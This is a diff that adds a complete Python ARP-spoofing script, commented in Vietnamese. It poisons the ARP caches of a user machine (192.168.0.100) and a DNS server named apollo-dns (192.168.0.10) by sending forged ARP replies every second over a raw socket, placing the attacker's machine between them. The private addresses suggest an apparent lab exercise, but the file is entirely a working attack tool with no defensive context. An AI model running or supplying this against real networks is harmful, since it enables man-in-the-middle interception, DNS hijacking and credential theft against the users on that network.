@@ -1,0 +1,44 @@
+#!/usr/bin/env python3
+"""ARP spoofing giua user (192.168.0.100) va apollo-dns (192.168.0.10)."""
+
+import socket
+import struct
+import sys
+import time
+
+USER = '192.168.0.100'
+APOLLO = '192.168.0.10'
+
+def get_mac(iface):
+    with open('/sys/class/net/%s/address' % iface) as f:
+        return f.read().strip()
+
+def mac_bytes(s):
+    return struct.pack('!6s', b''.join(bytes([int(p, 16)]) for p in s.split(':'))
+
+def arp_reply(src_ip, dst_ip, src_mac, dst_mac):
+    eth = struct.pack('!6s6sH', dst_mac, src_mac, 0x0806)
+    arp = struct.pack('!HHBBH6s4s6s4s', 1, 0x0800, 6, 4, 2,
+                      src_mac, socket.inet_aton(src_ip),
+                      dst_mac, socket.inet_aton(dst_ip))
+    return eth + arp
+
+def main():
+    iface = sys.argv[1] if len(sys.argv) > 1 else 'eth0'
+    mymac = mac_bytes(get_mac(iface))
+    bcast = mac_bytes('ff:ff:ff:ff:ff:ff')
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    s.bind((iface, 0))
+    print('ARP poisoning %s <-> %s qua %s' % (USER, APOLLO, iface), flush=True)
+    try:
+        while True:
+            # noi user: apollo o MAC cua attacker
+            s.send(arp_reply(APOLLO, USER, mymac, bcast))
+            # noi apollo: user o MAC cua attacker
+            s.send(arp_reply(USER, APOLLO, mymac, bcast))
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+
+if __name__ == '__main__':
+    main()
